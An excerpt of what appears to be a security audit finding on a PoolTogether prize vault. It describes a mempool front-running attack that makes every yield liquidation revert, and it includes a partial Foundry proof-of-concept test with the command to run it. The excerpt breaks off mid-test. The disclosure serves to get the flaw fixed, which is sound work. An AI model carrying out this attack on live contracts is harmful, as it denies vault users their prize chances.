...
Liquidations must be called on a regular basis to sell the yield tokens for prizePool tokens and contribute these prizePool tokens to the prizePool to increase the vault user's chance of winning.
...
1. A prizeVault based on SHIBE has minted 70% of the totalSupply
2. A liquidator makes a call to liquidate yield 
3. An attacker sees (2) in the mempool and front runs it by by depositing the remaining 30% of the totalSupply
4. When the liquidator's Tx goes through it will revert
5. The attacker can now withdraw his deposit and do this repeatedly to every single liquidation Tx 

I used 70% as the initial totalSupply but this was just to show the example, in reality the attack can be performed at any %

## Impact
Liquidations will always revert

The yield will never contribute to the prizePool so the chances of winning a a prize for all the users of the vault is unfairly reduced.
...
Now add the following `DOSLiquidationsPOC.sol` to /2024-05-pooltogether/pt-v5-vault/test/integration/DOSLiquidationsPOC.sol

The following foundry test test__DOSLiquidationsPOC() illustrates the attack scenario.

Run it with the following command line input

```terminal
forge test --mt test__DOSLiquidationsPOC -vv
```
...
contract DOSLiquidationsPOC is Test, BaseIntegration {
    ...
    function test__DOSLiquidationsPOC() public {
        // This represents multiple users, depositing SHIBE over time, such that it accumulates 70% of the totalSupply
        vm.startPrank(alice);
        prizeVault.deposit(55459713759985036315480765234, alice);

        // Yield accrual
        _accrueYield();

        // Liquidator sees the yield accrue and sends a Tx to liquidate it

        // Attacker sees the liquidator's Tx in the mempool and frontruns it by depositing the remaining 30% of the totalSupply
        vm.startPrank(attacker);
        prizeVault.deposit(23768448754279301278063185101, attacker);

        vm.stopPrank();

        // Liquidator's Tx finally goes through, but it will revert
        uint256 availableAssets = prizeVault.liquidatableBalanceOf(address(underlyingAsset));
        console.log("availableAssets to liquidate, that the attacker will prevent from liquidating =", availableAssets);
